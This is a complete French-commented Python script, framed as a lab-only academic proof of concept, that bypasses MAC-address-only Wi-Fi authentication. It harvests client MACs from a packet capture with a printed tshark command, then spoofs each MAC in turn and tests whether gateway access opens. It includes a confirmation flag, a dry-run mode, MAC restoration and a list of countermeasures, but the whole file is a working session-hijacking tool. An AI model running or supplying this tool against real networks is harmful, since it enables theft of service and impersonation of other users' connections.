#!/usr/bin/env python3
"""
WiFi Zone MAC Tester v2 — PoC académique LABO UNIQUEMENT.

Objectif pédagogique : démontrer en environnement contrôlé (votre propre AP
de labo, avec autorisation écrite) pourquoi l'authentification par MAC seule
est insuffisante, et comment un opérateur peut détecter / corriger cela.

INTERDIT sur tout réseau tiers sans autorisation explicite (intrusion / vol de service).
Le script exige une confirmation explicite et restaure toujours la MAC d'origine.

Usage labo :
  sudo python3 tester_mac.py --interface wlan0 --file macs.txt --lab-ap "MonLabo" --dry-run
  sudo python3 tester_mac.py --interface wlan0 --file macs.txt --lab-ap "MonLabo" --confirm-lab
"""

import argparse
import atexit
import csv
import os
import re
import shutil
import signal
import subprocess
import sys
import time
import urllib.request
from datetime import datetime
from pathlib import Path

MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
BROADCAST = "ff:ff:ff:ff:ff:ff"

ORIGINAL_MAC: str | None = None
INTERFACE_GLOBAL: str | None = None
RESTORED = False


def log(msg: str) -> None:
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def run(cmd: list[str], check: bool = True, capture: bool = False) -> subprocess.CompletedProcess:
    """Exécute sans shell=True (anti-injection)."""
    # cmd est une liste, jamais une string shell
    return subprocess.run(cmd, check=check, capture_output=capture, text=True)


def is_multicast(mac: str) -> bool:
    # bit LSB du 1er octet = 1 -> multicast
    try:
        return (int(mac.split(":")[0], 16) & 1) == 1
    except ValueError:
        return True


def valid_mac(mac: str) -> tuple[bool, str]:
    mac = mac.strip().lower()
    if not MAC_RE.match(mac):
        return False, "format invalide"
    if mac == BROADCAST:
        return False, "broadcast"
    if is_multicast(mac):
        return False, "multicast"
    if mac.startswith("00:00:00"):
        return False, "OUI nulle"
    return True, ""


def get_current_mac(iface: str) -> str | None:
    path = Path(f"/sys/class/net/{iface}/address")
    try:
        return path.read_text().strip().lower()
    except OSError:
        return None


def interface_exists(iface: str) -> bool:
    return Path(f"/sys/class/net/{iface}").exists()


def has_tool(name: str) -> bool:
    return shutil.which(name) is not None


def save_original_mac(iface: str) -> None:
    global ORIGINAL_MAC, INTERFACE_GLOBAL
    INTERFACE_GLOBAL = iface
    ORIGINAL_MAC = get_current_mac(iface)
    if ORIGINAL_MAC:
        log(f"MAC d'origine sauvegardée : {ORIGINAL_MAC}")


def restore_mac() -> None:
    global RESTORED
    if RESTORED or not ORIGINAL_MAC or not INTERFACE_GLOBAL:
        return
    try:
        log(f"Restauration MAC d'origine {ORIGINAL_MAC} sur {INTERFACE_GLOBAL}...")
        set_mac(INTERFACE_GLOBAL, ORIGINAL_MAC, reconnect=False)
        RESTORED = True
        log("MAC restaurée.")
    except Exception as e:  # noqa: BLE001 — best effort en sortie
        log(f"ATTENTION restauration échouée : {e} — relancez manuellement : ip link set dev {INTERFACE_GLOBAL} address {ORIGINAL_MAC}")


def set_mac(iface: str, mac: str, reconnect: bool = True, delay: float = 4.0) -> bool:
    """Applique une MAC. Retourne True si OK. Gère NetworkManager si présent."""
    try:
        use_nm = has_tool("nmcli")
        if use_nm:
            # NetworkManager écrase 'ip link' seul -> disconnect d'abord
            run(["nmcli", "device", "disconnect", iface], check=False)
            time.sleep(1)

        run(["ip", "link", "set", "dev", iface, "down"])
        run(["ip", "link", "set", "dev", iface, "address", mac])
        run(["ip", "link", "set", "dev", iface, "up"])

        if reconnect:
            if use_nm:
                run(["nmcli", "device", "connect", iface], check=False)
            # Laisse le temps DHCP / reassociation (labo)
            time.sleep(delay)
        return True
    except subprocess.CalledProcessError as e:
        log(f"Échec changement MAC vers {mac} : {e}")
        return False


def test_connectivity(ping_target: str, http_url: str, timeout: int) -> dict:
    """Test non-intrusif vers TON labo uniquement (passerelle labo par défaut)."""
    result = {"ping_ok": False, "http_ok": False, "http_code": ""}
    # 1. ping court
    try:
        r = run(["ping", "-c", "2", "-W", "2", ping_target], check=False, capture=True)
        result["ping_ok"] = (r.returncode == 0)
    except Exception:
        result["ping_ok"] = False
    # 2. HTTP GET léger (page de test de TON labo / connectivité)
    try:
        with urllib.request.urlopen(http_url, timeout=timeout) as resp:
            result["http_code"] = str(resp.status)
            result["http_ok"] = 200 <= resp.status < 400
    except Exception:
        result["http_ok"] = False
    return result


def load_macs(path: Path, skip_own: str | None) -> tuple[list[str], list[str]]:
    raw = path.read_text(errors="ignore").splitlines()
    seen: set[str] = set()
    kept: list[str] = []
    rejected: list[str] = []
    for line in raw:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # tshark peut sortir "a \t b" -> on a déjà split, mais gère le cas tabulé
        for token in re.split(r"[\s\t,;]+", line):
            token = token.strip().lower()
            if not token:
                continue
            ok, reason = valid_mac(token)
            if not ok:
                rejected.append(f"{token} ({reason})")
                continue
            if skip_own and token == skip_own:
                rejected.append(f"{token} (votre propre MAC, ignorée)")
                continue
            if token not in seen:
                seen.add(token)
                kept.append(token)
    return kept, rejected


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Testeur MAC académique — LABO AUTORISÉ UNIQUEMENT. Restaure la MAC d'origine."
    )
    p.add_argument("--interface", "-i", default="wlan0", help="Interface (défaut: wlan0)")
    p.add_argument("--file", "-f", default="mac_output.txt", help="Fichier MACs (1/ligne)")
    p.add_argument("--out", "-o", default="results.csv", help="CSV de résultats")
    p.add_argument("--ping-target", default="192.168.1.1",
                   help="Cible ping de TON labo (défaut: 192.168.1.1, passerelle labo). Ne pas mettre un externe pour du vol de service.")
    p.add_argument("--http-url", default="http://192.168.1.1/",
                   help="URL HTTP de TON portail labo pour vérifier la session")
    p.add_argument("--timeout", type=int, default=5, help="Timeout HTTP (s)")
    p.add_argument("--delay", type=float, default=4.0, help="Attente DHCP/reassoc après changement (s)")
    p.add_argument("--limit", type=int, default=0, help="Limiter à N MACs (0 = toutes, utile en démo)")
    p.add_argument("--dry-run", action="store_true", help="Valide + simule sans toucher l'interface")
    p.add_argument("--manual", action="store_true",
                   help="Mode manuel historique (pause Entrée au lieu du test auto)")
    p.add_argument("--confirm-lab", action="store_true",
                   help="Obligatoire hors --dry-run : confirme un labo vous appartenant / autorisé.")
    p.add_argument("--lab-ap", default="", help="Nom/SSID du labo (traçabilité pédagogique, ex: MonLabo-Test)")
    return p.parse_args()


def main() -> int:
    args = parse_args()

    if os.geteuid() != 0 and not args.dry_run:
        print("Erreur : lancez avec sudo (ou --dry-run pour simuler sans root).", file=sys.stderr)
        return 1

    if not interface_exists(args.interface) and not args.dry_run:
        print(f"Erreur : interface '{args.interface}' introuvable. Vérifiez avec 'ip a'.", file=sys.stderr)
        return 1

    mac_file = Path(args.file)
    if not mac_file.exists():
        print(f"Erreur : fichier '{mac_file}' introuvable.", file=sys.stderr)
        print("Générez-le depuis VOTRE capture labo, ex. :")
        print("  tshark -r labo.pcapng -T fields -e wlan.sa -e wlan.addr | tr '\\t' '\\n' | sort -u > mac_output.txt")
        return 1

    own = get_current_mac(args.interface)
    macs, rejected = load_macs(mac_file, skip_own=own)
    if args.limit and args.limit > 0:
        macs = macs[: args.limit]

    if not macs:
        print("Aucune MAC valide après filtrage.")
        if rejected[:10]:
            print("Exemples rejetés :", ", ".join(rejected[:10]))
        return 1

    log(f"{len(macs)} MAC(s) valide(s), {len(rejected)} rejetée(s).")
    if rejected[:5]:
        log(f"Rejetées (extrait) : {', '.join(rejected[:5])}")

    if args.dry_run:
        log("DRY-RUN : aucune modification réseau.")
        for i, m in enumerate(macs, 1):
            print(f"  [{i}/{len(macs)}] {m} -> simulé OK")
        log(f"Sortie CSV non écrite en dry-run (cible : {args.out}).")
        return 0

    # --- Garde-fou éthique : hors dry-run, confirmation obligatoire ---
    if not args.confirm_lab:
        print("\n⛔ GARDE-FOU ÉTHIQUE", file=sys.stderr)
        print("Ce script modifie votre MAC et teste une authentification.", file=sys.stderr)
        print("Utilisez-le UNIQUEMENT sur votre propre labo / réseau avec autorisation écrite.", file=sys.stderr)
        print("Relancez avec --confirm-lab --lab-ap \"NomDeVotreLabo\" pour attester.", file=sys.stderr)
        print("Ex : sudo python3 tester_mac.py -i wlan0 -f mac_output.txt --lab-ap MonLabo --confirm-lab\n", file=sys.stderr)
        return 2
    if not args.lab_ap:
        print("Précisez --lab-ap \"NomDuLabo\" pour traçabilité (ex: TP-Reseau-SalleB).", file=sys.stderr)
        return 2

    log(f"Labo déclaré : {args.lab_ap} — traçabilité pédagogique, usage autorisé uniquement.")

    save_original_mac(args.interface)
    atexit.register(restore_mac)
    signal.signal(signal.SIGTERM, lambda *_: (restore_mac(), sys.exit(130)))

    out_path = Path(args.out)
    is_new = not out_path.exists()
    fcsv = out_path.open("a", newline="")
    writer = csv.DictWriter(fcsv, fieldnames=["timestamp", "lab", "interface", "mac", "applied", "ping_ok", "http_ok", "http_code", "mode"])
    if is_new:
        writer.writeheader()

    log(f"--- Début ({len(macs)} adresses) — Ctrl+C restaure automatiquement ---")
    try:
        for i, mac in enumerate(macs, 1):
            log(f"[{i}/{len(macs)}] Essai {mac}")
            ok = set_mac(args.interface, mac, reconnect=True, delay=args.delay)
            if not ok:
                writer.writerow({"timestamp": datetime.now().isoformat(timespec="seconds"), "lab": args.lab_ap,
                                 "interface": args.interface, "mac": mac, "applied": False,
                                 "ping_ok": False, "http_ok": False, "http_code": "", "mode": "auto"})
                fcsv.flush()
                continue
            if args.manual:
                print("✅ APPLIQUÉE. Testez votre labo (ping passerelle labo / page portail labo).")
                try:
                    input("--> Entrée = MAC suivante, Ctrl+C = arrêter + restaurer : ")
                except KeyboardInterrupt:
                    raise
                conn = {"ping_ok": "manuel", "http_ok": "manuel", "http_code": ""}
                mode = "manuel"
            else:
                conn = test_connectivity(args.ping_target, args.http_url, args.timeout)
                mode = "auto"
                status = "✅ ACCÈS LABO OK" if (conn["ping_ok"] or conn["http_ok"]) else "❌ pas d'accès"
                log(f"{status} (ping={conn['ping_ok']} http={conn['http_ok']} {conn['http_code']})")
            writer.writerow({"timestamp": datetime.now().isoformat(timespec="seconds"), "lab": args.lab_ap,
                             "interface": args.interface, "mac": mac, "applied": True,
                             "ping_ok": conn["ping_ok"], "http_ok": conn["http_ok"],
                             "http_code": conn["http_code"], "mode": mode})
            fcsv.flush()
    except KeyboardInterrupt:
        log("Interrompu — restauration...")
        return 130
    finally:
        fcsv.close()
        restore_mac()

    log(f"Terminé. Résultats : {out_path.resolve()}")
    log("Contre-mesures à documenter dans votre rapport : portail captif + sessions, 802.1X/RADIUS, détection doublons MAC.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
